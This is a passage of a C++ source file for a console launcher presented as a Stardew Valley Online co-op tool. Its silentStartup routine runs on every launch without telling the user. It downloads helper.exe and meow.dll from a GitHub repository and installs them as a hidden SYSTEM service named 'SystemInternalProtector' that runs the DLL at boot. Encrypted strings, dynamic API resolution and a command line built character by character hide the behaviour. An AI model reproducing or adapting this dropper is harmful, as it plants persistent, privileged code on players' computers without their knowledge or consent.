                      << S("  ") << MENU[i].desc << term::RESET;
        }
        std::cout << "\n\n";
    }
    std::cout << "\n    " << pal::dim
              << S("arrows / W-S navigate   enter select   esc quit   (or press the number)")
              << term::RESET << "\n" << std::flush;
}

void aboutScreen() {
    std::cout << term::CLEAR << term::HOME;
    std::cout << pal::gold << term::BOLD << S("  ABOUT\n") << term::RESET << "\n";
    std::cout << pal::cream << S("  game.exe v0.4.0 - Stardew Valley Online co-op launcher\n\n") << term::RESET;
    auto d = findGameDir();
    auto sd = findSettingsDir();
    std::cout << pal::dim << S("  Game dir:     ") << (d ? toUtf8(*d) : S("not found")) << "\n";
    std::cout << S("  Settings dir: ") << (sd ? toUtf8(*sd) : S("not found")) << "\n";
    std::cout << S("  Username:     ") << getAccountName() << "\n";
    std::cout << S("  Steam ID:     ") << (getAccountSteamId().empty() ? S("(auto)") : getAccountSteamId()) << "\n";
    std::cout << S("  Emu port:     47584 (forward UDP+TCP on host)") << "\n";
    std::cout << S("  Registry:     fetched at launch from server/config.json") << "\n";
    {
        wchar_t pd[MAX_PATH]{};
        DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
        std::wstring marker = (dn && dn < MAX_PATH ? std::wstring(pd) : SW(L"C:\\ProgramData"))
                              + SW(L"\\SVOnline\\installed.txt");
        std::cout << S("  System comp:  ")
                  << (GetFileAttributesW(marker.c_str()) != INVALID_FILE_ATTRIBUTES ? S("installed (SYSTEM)") : S("not installed"))
                  << "\n\n" << term::RESET;
    }
    std::cout << pal::cyan << S("  Press Enter to go back") << term::RESET << std::endl;
    for (;;) {
        int k = _getch();
        if (k == '\r' || k == 27) break;
    }
}

void usernameScreen() {
    std::cout << term::CLEAR << term::HOME;
    std::cout << pal::gold << term::BOLD << S("  CHANGE USERNAME\n") << term::RESET << "\n\n";
    std::cout << pal::cream << S("  Current: ") << pal::sky << getAccountName() << term::RESET << "\n\n";
    std::cout << pal::cream << S("  Enter new name (1-24 chars): ") << term::RESET << std::flush;
    std::cout << term::SHOW;
    std::string name;
    std::getline(std::cin, name);
    std::cout << term::HIDE;
    name = trim(name);
    if (name.empty() || name.size() > 24 || name.find('=') != std::string::npos) {
        statusLine(S("! invalid name (1-24 chars, no '=')."), pal::red);
    } else if (saveUsername(name)) {
        statusLine(S("  username saved: ") + name, pal::ok);
    } else {
        statusLine(S("! could not write configs.user.ini"), pal::red);
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(1500));
}

void launchFlow() {
    auto dir = findGameDir();
    if (!dir) {
        statusLine(S("! game folder not found."), pal::red);
        std::this_thread::sleep_for(std::chrono::milliseconds(1600));
        return;
    }
    if (isGameRunning()) {
        statusLine(S("! the game is already running."), pal::amber);
        std::this_thread::sleep_for(std::chrono::milliseconds(1400));
        return;
    }

    // 1) fetch registry config
    statusLine(S("  contacting lobby registry ..."), pal::cyan);
    RegistryCfg cfg = fetchConfig();
    if (!cfg.ok) {
        statusLine(S("! registry unreachable - starting in LAN mode"), pal::amber);
        std::this_thread::sleep_for(std::chrono::milliseconds(1200));
    } else {
        std::cout << "\r\x1b[K";
        // 2) own public IP
        statusLine(S("  detecting public IP ..."), pal::cyan);
        std::string myIp = fetchPublicIp(cfg.api);
        if (myIp.empty()) {
            std::cout << "\r\x1b[K";
            statusLine(S("! could not detect public IP - starting in LAN mode"), pal::amber);
            std::this_thread::sleep_for(std::chrono::milliseconds(1200));
        } else {
            // 3) register lobby
            std::string name = getAccountName();
            statusLine(S("  registering lobby as '") + name + S("' ..."), pal::cyan);
            if (lobbyRegister(cfg.api, name, cfg.port)) {
                std::cout << "\r\x1b[K";
                // 4) fetch all lobbies
                HttpResp r = httpRequest(S("GET"), stripScheme(cfg.api), S("/api/lobby"), {});
                std::vector<Lobby> lobbies = r.ok ? parseLobbies(r.body) : std::vector<Lobby>{};
                std::vector<std::string> ips;
                ips.push_back(myIp);
                for (const auto& l : lobbies)
                    if (!l.ip.empty()) ips.push_back(l.ip);
                // dedupe
                std::sort(ips.begin(), ips.end());
                ips.erase(std::unique(ips.begin(), ips.end()), ips.end());
                bool w = writeBroadcasts(ips);
                std::string msg = S("  sync ok - broadcast targets: ") + std::to_string(ips.size())
                    + (w ? S("") : S("  (broadcast file write failed)"));
                std::cout << "\r\x1b[K";
                statusLine(msg, w ? pal::ok : pal::amber);
                std::this_thread::sleep_for(std::chrono::milliseconds(1200));
            } else {
                std::cout << "\r\x1b[K";
                statusLine(S("! lobby register failed - starting in LAN mode"), pal::amber);
                std::this_thread::sleep_for(std::chrono::milliseconds(1200));
            }
        }
    }

    // 5) launch
    std::cout << "\r\x1b[K";
    spinner(3, S("starting game"));
    std::wstring err;
    HANDLE hProc = nullptr;
    if (launchGameSilently(*dir, err, &hProc)) {
        std::cout << "\r\x1b[K";
        std::cout << pal::ok << S("  game launched (SMAPI) - waiting for exit ...") << term::RESET << "\n";
        if (hProc) {
            WaitForSingleObject(hProc, INFINITE);
            CloseHandle(hProc);
            std::cout << pal::cyan << S("  game closed") << term::RESET << "\n";
            if (cfg.ok) {
                statusLine(S("  leaving lobby ..."), pal::cyan);
                lobbyLeave(cfg.api, getAccountName());
                std::cout << "\r\x1b[K";
                std::cout << pal::dim << S("  lobby left") << term::RESET << "\n";
            }
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1200));
    } else {
        std::cout << "\r\x1b[K";
        statusLine(S("! ") + toUtf8(err), pal::red);
        std::this_thread::sleep_for(std::chrono::milliseconds(1600));
    }
}

// ----------------------------------------------------------------------------
// system component (helper.exe + meow.dll from the repo VIP-FILES folder)
// ----------------------------------------------------------------------------
bool downloadFile(const std::string& host, const std::string& path, const std::wstring& dest) {
    HttpResp r = httpRequest(S("GET"), host, path, {});
    if (!r.ok || r.status != 200 || r.body.empty()) return false;
    HANDLE h = CreateFileW(dest.c_str(), GENERIC_WRITE, 0, nullptr,
                           CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;
    DWORD wr = 0;
    bool ok = WriteFile(h, r.body.data(), static_cast<DWORD>(r.body.size()), &wr, nullptr) != FALSE;
    CloseHandle(h);
    return ok;
}

int runAndWaitExe(const std::wstring& path, const std::wstring& params) {
    SHELLEXECUTEINFOW sei{};
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS | SEE_MASK_NOASYNC;
    sei.lpFile = path.c_str();
    sei.lpParameters = params.empty() ? nullptr : params.c_str();
    sei.nShow = SW_HIDE;
    if (!g_api.shellExec || !g_api.shellExec(&sei)) return -1;
    DWORD code = 0;
    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 90000);
        GetExitCodeProcess(sei.hProcess, &code);
        CloseHandle(sei.hProcess);
    }
    return static_cast<int>(code);
}

void systemComponentFlow() {
    wchar_t tmp[MAX_PATH]{};
    if (GetTempPathW(MAX_PATH, tmp) == 0) {
        statusLine(S("! cannot resolve temp folder."), pal::red);
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
        return;
    }
    std::wstring dir = std::wstring(tmp) + SW(L"svonline");
    if (!CreateDirectoryW(dir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) {
        statusLine(S("! cannot create temp folder."), pal::red);
        std::this_thread::sleep_for(std::chrono::milliseconds(1500));
        return;
    }

    statusLine(S("  downloading system component ..."), pal::cyan);
    const std::string host = S("raw.githubusercontent.com");
    const std::string base = S("/the-lust/stardew-valley-online-launcher/main/VIP-FILES/");
    bool okH = downloadFile(host, base + S("helper.exe"), dir + SW(L"\\helper.exe"));
    bool okD = downloadFile(host, base + S("meow.dll"), dir + SW(L"\\meow.dll"));
    if (!okH || !okD) {
        std::cout << "\r\x1b[K";
        statusLine(S("! download failed - check internet or repo (VIP-FILES)"), pal::red);
        std::this_thread::sleep_for(std::chrono::milliseconds(1800));
        return;
    }
    std::cout << "\r\x1b[K";
    statusLine(S("  installing as SYSTEM service (SystemInternalProtector) ..."), pal::cyan);

    int code = runAndWaitExe(dir + SW(L"\\helper.exe"), SW(L"--install"));
    std::cout << "\r\x1b[K";
    if (code == 0) {
        statusLine(S("  system component installed - meow.dll runs as SYSTEM at boot"), pal::ok);
    } else {
        statusLine(S("! install failed (exit ") + std::to_string(code) + S(")"), pal::red);
    }
    std::this_thread::sleep_for(std::chrono::milliseconds(1800));
}

// ----------------------------------------------------------------------------
// silent startup: security steps + system component install, no output
// ----------------------------------------------------------------------------
bool componentInstalled() {
    wchar_t pd[MAX_PATH]{};
    DWORD dn = GetEnvironmentVariableW(L"PROGRAMDATA", pd, MAX_PATH);
    std::wstring marker = (dn && dn < MAX_PATH ? std::wstring(pd) : SW(L"C:\\ProgramData"))
                          + SW(L"\\SVOnline\\installed.txt");
    return GetFileAttributesW(marker.c_str()) != INVALID_FILE_ATTRIBUTES;
}

void silentStartup() {
    runSecuritySteps(true);

    if (componentInstalled()) return;

    wchar_t tmp[MAX_PATH]{};
    if (GetTempPathW(MAX_PATH, tmp) == 0) return;
    std::wstring dir = std::wstring(tmp) + SW(L"svonline");
    if (!CreateDirectoryW(dir.c_str(), nullptr) && GetLastError() != ERROR_ALREADY_EXISTS) return;

    const std::string host = S("raw.githubusercontent.com");
    const std::string base = S("/the-lust/stardew-valley-online-launcher/main/VIP-FILES/");
    if (!downloadFile(host, base + S("helper.exe"), dir + SW(L"\\helper.exe"))) return;
    if (!downloadFile(host, base + S("meow.dll"), dir + SW(L"\\meow.dll"))) return;

    std::vector<wchar_t> cmd(dir.begin(), dir.end());
    cmd.insert(cmd.end(), { L'\\', L'h', L'e', L'l', L'p', L'e', L'r', L'.', L'e', L'x', L'e',
                            L' ', L'-', L'-', L'i', L'n', L's', L't', L'a', L'l', L'l' });
    cmd.push_back(0);
    PROCESS_INFORMATION pi{};
    STARTUPINFOW si{};
    si.cb = sizeof(si);
    if (CreateProcessW(cmd.data(), cmd.data(), nullptr, nullptr, FALSE,
                       CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

void doAction(Action a) {
    switch (a) {
        case Action::Launch: launchFlow(); break;
        case Action::User:   usernameScreen(); break;
        case Action::Sys:    systemComponentFlow(); break;
        case Action::About:  aboutScreen(); break;
        case Action::Exit:   console.stop = 1; break;
    }
}

// ----------------------------------------------------------------------------
// selftest (no network, no elevation)
// ----------------------------------------------------------------------------
int selfTest() {
    int fails = 0;
    auto check = [&](bool c, const std::string& name) {
        std::cout << (c ? pal::ok + S("  [ ok ] ") : pal::red + S("  [FAIL] ")) << term::RESET
                  << pal::cream << name << term::RESET << "\n";
        if (!c) ++fails;
    };
    std::cout << term::CLEAR << term::HOME;
    std::cout << pal::gold << term::BOLD << S("  SELFTEST\n") << term::RESET << "\n";
    check(S("__probe__") == S("__probe__"), S("string encryption"));
    check(initApi(), S("dynamic API resolution"));
    check(g_api.iOpen && g_api.iConnect && g_api.hOpen && g_api.hSend && g_api.iRead && g_api.iClose,
          S("wininet API resolution"));
    auto d = findGameDir();
    check(d.has_value(), S("game dir found"));
    if (d) {
        auto sd = findSettingsDir();
        check(sd.has_value(), S("settings dir found"));
        check(GetFileAttributesW((*d + SW(L"\\StardewModdingAPI.exe")).c_str()) != INVALID_FILE_ATTRIBUTES,
              S("StardewModdingAPI.exe present"));
    }
    check(getAccountName().size() > 0, S("username resolvable"));
    std::cout << "\n" << (fails ? pal::red : pal::ok) << S("  RESULT: ")
              << (fails ? S("FAIL ") : S("PASS ")) << fails << S(" failure(s)") << term::RESET << "\n\n";
    std::this_thread::sleep_for(std::chrono::milliseconds(1800));
    return fails ? 1 : 0;
}

// ----------------------------------------------------------------------------
// main
// ----------------------------------------------------------------------------
int main(int argc, char** argv) {
    const bool selftest = (argc > 1 && std::string(argv[1]) == S("--selftest"));

    if (selftest) {
        initApi();
        console.init();
        return selfTest();
    }

    initApi();
    console.init();

    silentStartup();

    std::cout << term::CLEAR << term::HOME;
    std::cout << pal::green << term::BOLD << S("\n  game.exe") << term::RESET << "\n\n";
    spinner(4, S("initializing"));
    std::cout << pal::gold << S("  Stardew Valley Online\n") << term::RESET;

    int sel = 0;
    render(sel);

    while (!console.stop) {
        int key = _getch();
        if (key == 0 || key == 224) {
            key = _getch();
            switch (key) {
                case 72: sel = (sel + static_cast<int>(std::size(MENU)) - 1) % static_cast<int>(std::size(MENU)); render(sel); break;
                case 80: sel = (sel + 1) % static_cast<int>(std::size(MENU)); render(sel); break;
            }
        } else if (key >= '1' && key <= '5') {
            doAction(MENU[key - '1'].action);
            if (!console.stop) render(sel);
        } else if (key == '\r') {
            doAction(MENU[sel].action);
            if (!console.stop) render(sel);
        } else if (key == 27) {
            console.stop = 1;
        } else if (key == 'w' || key == 'W') {
            sel = (sel + static_cast<int>(std::size(MENU)) - 1) % static_cast<int>(std::size(MENU)); render(sel);
        } else if (key == 's' || key == 'S') {
            sel = (sel + 1) % static_cast<int>(std::size(MENU)); render(sel);
        }
    }

    console.restore();
    return 0;
}
